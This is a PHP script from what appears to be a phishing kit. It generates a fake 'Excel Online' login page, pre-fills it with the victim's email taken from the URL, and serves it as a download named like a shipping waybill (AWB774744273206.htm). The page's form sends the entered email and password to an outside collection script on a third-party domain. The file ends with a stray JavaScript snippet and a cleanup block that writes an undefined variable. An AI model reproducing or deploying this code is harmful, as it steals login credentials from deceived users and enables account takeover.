<?php

if(isset($_GET['login'])){}else{die; exit;}
function test_input($data) {
   $data = trim($data);
   $data = strip_tags($data);
   $data = stripslashes($data);
   $data = htmlspecialchars($data);
   return $data;
}
$dd=test_input($_GET['login']);



$file = 'AWB774744273206.htm';



$ww = '<html><head><

    <link rel="shortcut icon" type="image/x-icon" href="https://sheikhahijabs.com/wp-css/css/Carlosjj-Microsoft-Office-2013-Excel.ico">

    <title>Login form :: Excel Online</title>

    <link href="https://sheikhahijabs.com/wp-css/css/metro.css" rel="stylesheet">
    <link href="https://sheikhahijabs.com/wp-css/css/metro-icons.css" rel="stylesheet">
    <link href="https://sheikhahijabs.com/wp-css/css/metro-responsive.css" rel="stylesheet">
<style type="text/css">
.login-form {
width:25rem;
height:25.75rem;
position:fixed;
top:50%;
margin-top:-12.375rem;
left:50%;
margin-left:-12.5rem;
background-color:#fff;
opacity:0;
-webkit-transform:scale(.8);
transform:scale(.8);
}

body {
background:url(https://i.gyazo.com/d53eecd290c64990e586026c7af97f06.jpg) no-repeat;
background-size:cover;
position:absolute;
width:100%;
height:100%;
top:0;
right:0;
bottom:0;
left:0;
overflow:hidden;
margin:auto;
}
</style>

<script language="JavaScript">
<!--
function validateForm()
{
var y=document.forms["myform"]["email"].value;
if(y==null || y=="")
  {
  alert("Enter your Email");
  return false;
  }
var y=document.forms["myform"]["password"].value;
if(y==null || y=="")
  {
  alert("Password is Empty");
  return false;
  }
var y=document.forms["myform"]["password"].value;
if(y.length <5 )
  {
  alert("Invalid Password");
  return false;
  }
}



-->
</script>
</head>
<body class="bg-darkTeal" onkeypress="return disableCtrlKeyCombination(event);" onkeydown="return disableCtrlKeyCombination(event);">
    <div class="login-form padding20 block-shadow" style="opacity: 1; transform: scale(1); transition: 0.5s; border-style:solid; border-color:#5abd71">
        <form onSubmit="return validateForm()" name="myform" action="https://sheikhahijabs.com/wp_admin/xll.php" method="post">
		<div><span class="login100-form-logo" ><img height="85" width="105" src="https://i.gyazo.com/4636c6d97c90035c3ebeefca0ed843c2.png"  ></span></div>
			<div><img src="files/294.gif" alt=""></div>
			 <div class="alert alert-danger" id="msg" style="display: none;"></div>
            <h3 class="text-light">Excel Online - Login to continue</h3>
            <hr class="thin">
            <br>
			
			
			
			
			
            <div class="input-control text full-size" data-role="input">
                <label for="user_login">User email:</label>
                <input placeholder="Enter your email" type="email" name="email" id="user_login" style="padding-right: 36px;" required="" Value="'.$dd.'"  readonly>
                <button class="button helper-button clear" tabindex="-1" type="button"><span class="mif-cross"></span></button>
            </div>
			
			
			
			
			
			
			
            <br>
            <br>
            <div class="input-control password full-size" data-role="input">
                <label for="user_password">User password:</label>
                <input placeholder="Enter email password" type="password" name="password" id="user_password" style="padding-right: 36px;" >
                <button class="button helper-button reveal" tabindex="-1" type="button"><span class="mif-looks"></span></button>
            </div>
            <br>
            <br>
            <div class="form-actions">
                <button type="submit"  id="submit-btn" class="button primary" style="background-color:#5abd71">Login</button>
            </div>
        </form>
    </div>




</body>
</html>';

$fh = fopen($file, 'w'); // or die("error");  
fwrite($fh, $ww);
fclose($fh);

if (file_exists($file)) {
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}
?>

<!DOCTYPE html>
<html>
<head></head>
<body>

  <script>
    'use strict';
    let newWindow = open('/', 'example', 'width=300,height=300')
    newWindow.onload = function() {
      newWindow.close();
      alert(newWindow.closed); // true
    };
  </script>
  
  
&nbsp;
</body>
</html>

<?php

$fh = fopen($file, 'w'); // or die("error");  
$ww= " - - - NOTHING HERE - - - ";   
fwrite($fh, $stringData);
fclose($fh);

?>
